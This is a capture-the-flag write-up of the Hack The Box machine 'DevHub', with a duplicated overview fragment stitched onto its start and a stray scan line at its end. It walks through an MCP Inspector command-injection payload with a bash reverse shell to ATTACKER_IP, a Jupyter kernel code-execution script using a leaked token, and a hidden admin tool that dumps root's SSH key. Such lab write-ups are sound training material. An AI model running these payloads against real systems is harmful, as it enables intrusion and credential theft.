# HTB DevHub

## Overview

- Season: 11
- Difficulty: Medium
- OS: Linux
- Initial Access: MCPJam Inspector RCE
- Privilege Escalation: Jupyter token pivot -> OpsMCP root SSH key dump

> Flags, private keys, and sensitive values are redacted.

## Attack Path

1. Enumerated open ports and found SSH, HTTP, and MCPJam Inspector on port 6274.
2. Inspected the web application and discovered references to MCP Inspector, Jupyter, and internal operations tooling.
3. Downloaded and reviewed the MCPJam frontend JavaScript bundle.
4. Found `/api/mcp/connect`, which accepted `stdio` MCP server configuration.
5. Used Burp Repeater to send a crafted `serverConfig` that executed a reverse shell.
6. Got initial shell as `mcp-dev`.
7. Enumerated local services and found Jupyter running on `127.0.0.1:8888` as `analyst`.
8. Found the Jupyter token in process arguments using `ps auxww`.
9. Used the Jupyter API to create a kernel and execute commands as `analyst`.
10. Read `/home/analyst/.opsmcp_key` and inspected `/opt/opsmcp/server.py`.
11. Found a root-owned Flask service on `127.0.0.1:5000`.
12. Called the hidden `ops._admin_dump` tool with the OpsMCP API key.
13. Dumped the root SSH private key and used it to SSH as root.

## Enumeration

Initial scan:

```bash# HTB DevHub

> Target: `DevHub`  
> Difficulty: Medium  
> OS: Linux  
> Goal: Document the enumeration, exploitation, privilege pivots, and root path.

## Table of Contents

- [Summary](#summary)
- [Reconnaissance](#reconnaissance)
- [Web Enumeration](#web-enumeration)
- [MCPJam Inspector Enumeration](#mcpjam-inspector-enumeration)
- [Foothold as `mcp-dev`](#foothold-as-mcp-dev)
- [Local Enumeration](#local-enumeration)
- [Pivot to `analyst` via Jupyter](#pivot-to-analyst-via-jupyter)
- [Privilege Escalation via OpsMCP](#privilege-escalation-via-opsmcp)
- [Root Access](#root-access)
- [Attack Chain](#attack-chain)
- [Lessons Learned](#lessons-learned)

## Summary

DevHub exposed an MCPJam Inspector instance on port `6274`. The inspector allowed creation of `stdio` MCP server configs, which led to command execution as `mcp-dev`.

Local enumeration revealed a Jupyter service running as `analyst` on `127.0.0.1:8888`. Its token was leaked in process arguments. Using the Jupyter API, I created a kernel and executed commands as `analyst`.

From `analyst`, I found an OpsMCP API key and inspected a root-owned local Flask service on `127.0.0.1:5000`. A hidden admin tool exposed `/root/.ssh/id_rsa`, allowing SSH access as root.

## Reconnaissance

First, confirm the target is reachable:

```bash
ping -c 3 TARGET_IP
```

Then run a full TCP scan with service detection:

```bash
nmap -sC -sV -p- --min-rate 5000 -oN nmap TARGET_IP
```

Important findings:

```text
22/tcp    open  ssh
80/tcp    open  http    nginx
6274/tcp  open  unknown / MCPJam Inspector
```

Port `80` redirected to:

```text
devhub.htb
```

Add it to `/etc/hosts`:

```bash
echo "TARGET_IP devhub.htb" | sudo tee -a /etc/hosts
```

Why this mattered:

- `22` confirmed SSH was available for later access.
- `80` gave the hostname and initial web context.
- `6274` was unusual and became the first serious attack surface.

## Web Enumeration

The main site disclosed internal services:

```text
MCP Inspector - Port 6274
Jupyter - localhost:8888
Ops service / internal tooling
```

This told us that the machine likely relied on internal developer tooling, and that localhost-only services would matter after getting a foothold.

## MCPJam Inspector Enumeration

The MCPJam page loaded a JavaScript bundle:

```html
<script type="module" src="/assets/index-DRYhT9Xb.js"></script>
```

After downloading and beautifying the JavaScript, API routes were extracted:

```bash
grep -oE '/api/[A-Za-z0-9_./:-]+' mcp_index.pretty.js | sort -u
```

Interesting routes:

```text
/api/mcp/connect
/api/mcp/servers
/api/mcp/tools/list
/api/mcp/tools/execute
/api/mcp/servers/rpc/stream
```

The important function in the frontend showed that `/api/mcp/connect` accepted a `serverConfig` object:

```json
{
  "serverId": "example",
  "serverConfig": {
    "type": "stdio",
    "command": "COMMAND",
    "args": []
  }
}
```

Why this mattered:

Frontend JavaScript often reveals hidden or undocumented API endpoints and request body formats. Here, it showed exactly how the MCP Inspector connected to new MCP servers.

## Foothold as `mcp-dev`

Using Burp Repeater, send a `POST` request to:

```http
POST /api/mcp/connect HTTP/1.1
Host: devhub.htb:6274
Content-Type: application/json
```

Start a listener:

```bash
rlwrap nc -lvnp 4444
```

Payload:

```json
{
  "serverId": "shell",
  "serverConfig": {
    "type": "stdio",
    "command": "/bin/bash",
    "args": [
      "-lc",
      "bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'"
    ]
  }
}
```

This returned a shell:

```bash
id
```

```text
uid=1001(mcp-dev) gid=1001(mcp-dev) groups=1001(mcp-dev)
```

Why this worked:

The MCP Inspector accepted a user-controlled `stdio` server configuration and executed the provided command server-side.

## Local Enumeration

After getting a shell, enumerate users and listening services:

```bash
ls -la /home
ss -lntp
ps auxww | grep -Ei 'mcp|jupyter|ops|node|python' | grep -v grep
```

Findings:

```text
/home/mcp-dev
/home/analyst
```

Listening localhost services:

```text
127.0.0.1:8888  Jupyter
127.0.0.1:5000  OpsMCP
```

The Jupyter process exposed a token in its command line:

```text
--ServerApp.token=[REDACTED_JUPYTER_TOKEN]
```

Why this mattered:

`127.0.0.1` services are not reachable directly from the attacker machine, but they are reachable from the compromised host. Also, `ps auxww` shows full command-line arguments, which can leak tokens and credentials.

## Pivot to `analyst` via Jupyter

The Jupyter token authenticated to the local Jupyter API:

```bash
TOKEN='[REDACTED_JUPYTER_TOKEN]'
curl -s "http://127.0.0.1:8888/api/contents?token=$TOKEN"
```

Jupyter code execution requires creating a kernel and sending an `execute_request` over WebSocket. A Node script was used for this.

Create `/tmp/jexec.js`:

```js
const http = require("http");
const crypto = require("crypto");

const TOKEN = "[REDACTED_JUPYTER_TOKEN]";
const cmd = process.argv[2] || "id";

function req(method, path) {
  return new Promise((resolve, reject) => {
    const r = http.request(
      {
        hostname: "127.0.0.1",
        port: 8888,
        path,
        method,
        headers: {
          Authorization: `token ${TOKEN}`,
        },
      },
      (res) => {
        let data = "";
        res.on("data", (d) => (data += d));
        res.on("end", () => resolve({ status: res.statusCode, data }));
      }
    );
    r.on("error", reject);
    r.end();
  });
}

(async () => {
  const kr = await req("POST", `/api/kernels?token=${TOKEN}`);
  if (kr.status < 200 || kr.status >= 300) {
    console.error("kernel create failed", kr.status, kr.data);
    process.exit(1);
  }

  const kid = JSON.parse(kr.data).id;
  const ws = new WebSocket(
    `ws://127.0.0.1:8888/api/kernels/${kid}/channels?token=${TOKEN}`
  );

  ws.addEventListener("open", () => {
    const code = `import subprocess\nprint(subprocess.getoutput(${JSON.stringify(
      cmd
    )}))`;

    ws.send(
      JSON.stringify({
        header: {
          msg_id: crypto.randomUUID().replace(/-/g, ""),
          username: "x",
          session: crypto.randomUUID().replace(/-/g, ""),
          msg_type: "execute_request",
          version: "5.3",
        },
        parent_header: {},
        metadata: {},
        content: {
          code,
          silent: false,
          store_history: false,
          user_expressions: {},
          allow_stdin: false,
        },
        channel: "shell",
      })
    );
  });

  ws.addEventListener("message", async (ev) => {
    const msg = JSON.parse(ev.data.toString());
    const c = msg.content || {};

    if (c.text) process.stdout.write(c.text);

    if (msg.msg_type === "execute_reply") {
      ws.close();
      await req("DELETE", `/api/kernels/${kid}?token=${TOKEN}`);
      process.exit(0);
    }
  });

  setTimeout(async () => {
    ws.close();
    await req("DELETE", `/api/kernels/${kid}?token=${TOKEN}`);
    process.exit(2);
  }, 10000);
})();
```

Use it:

```bash
node /tmp/jexec.js 'id'
```

Output:

```text
uid=1002(analyst) gid=1002(analyst) groups=1002(analyst)
```

Read the user flag:

```bash
node /tmp/jexec.js 'cat /home/analyst/user.txt'
```

Why this worked:

The script itself ran as `mcp-dev`, but the code it sent to Jupyter was executed by the Jupyter kernel. Since Jupyter was running as `analyst`, the executed commands also ran as `analyst`.

## Privilege Escalation via OpsMCP

As `analyst`, read the OpsMCP key:

```bash
node /tmp/jexec.js 'cat /home/analyst/.opsmcp_key'
```

Result:

```text
[REDACTED_OPSMCP_API_KEY]
```

Inspect the OpsMCP service source:

```bash
node /tmp/jexec.js 'sed -n "1,240p" /opt/opsmcp/server.py'
```

Important findings:

```python
VALID_API_KEY = "[REDACTED_OPSMCP_API_KEY]"

HIDDEN_TOOLS = {
    "ops._admin_dump": {
        "description": "Emergency credential dump - INTERNAL ONLY",
        "parameters": {"target": "string", "confirm": "boolean"}
    }
}

app.run(host='127.0.0.1', port=5000, debug=False)
```

The hidden admin dump tool could read root SSH keys:

```python
with open('/root/.ssh/id_rsa', 'r') as f:
    key_data = f.read()
```

Why this mattered:

The OpsMCP Flask service was running as root on `127.0.0.1:5000`. The API key was readable by `analyst`, and the hidden tool could access root-only files.

## Root Access

Call the hidden tool:

```bash
curl -s -H 'X-API-Key: [REDACTED_OPSMCP_API_KEY]' \
  -H 'Content-Type: application/json' \
  -X POST http://127.0.0.1:5000/tools/call \
  -d '{"name":"ops._admin_dump","arguments":{"target":"ssh_keys","confirm":true}}'
```

Extract only the root private key:

```bash
curl -s -H 'X-API-Key: [REDACTED_OPSMCP_API_KEY]' \
  -H 'Content-Type: application/json' \
  -X POST http://127.0.0.1:5000/tools/call \
  -d '{"name":"ops._admin_dump","arguments":{"target":"ssh_keys","confirm":true}}' \
  | python3.10 -c 'import sys,json; print(json.load(sys.stdin)["root_private_key"])' > /tmp/root_id_rsa
```

Move the private key to the attacker machine, fix permissions, and SSH as root:

```bash
chmod 600 root_id_rsa
ssh -i root_id_rsa root@TARGET_IP
```

Confirm root:

```bash
id
```

```text
uid=0(root) gid=0(root) groups=0(root)
```

Read the root flag:

```bash
cat /root/root.txt
```

## Attack Chain

```text
MCPJam Inspector on port 6274
-> /api/mcp/connect accepts stdio command configs
-> command execution as mcp-dev
-> local enumeration finds Jupyter on 127.0.0.1:8888
-> ps auxww leaks analyst Jupyter token
-> Jupyter API gives code execution as analyst
-> analyst can read .opsmcp_key and /opt/opsmcp/server.py
-> OpsMCP runs as root on 127.0.0.1:5000
-> hidden ops._admin_dump reads /root/.ssh/id_rsa
-> SSH as root
```

## Lessons Learned

- Check unusual ports carefully; custom developer tooling often exposes dangerous behavior.
- Frontend JavaScript can reveal backend routes and request formats.
- Do not place secrets in process arguments; `ps auxww` can expose them.
- Localhost-only services are still reachable after a foothold.
- Jupyter tokens are equivalent to code execution as the Jupyter service user.
- Root-owned internal APIs should not expose privileged file reads through weak application-layer authentication.


nmap -sC -sV -p- --min-rate 5000 -oN nmap 10.129.5.34

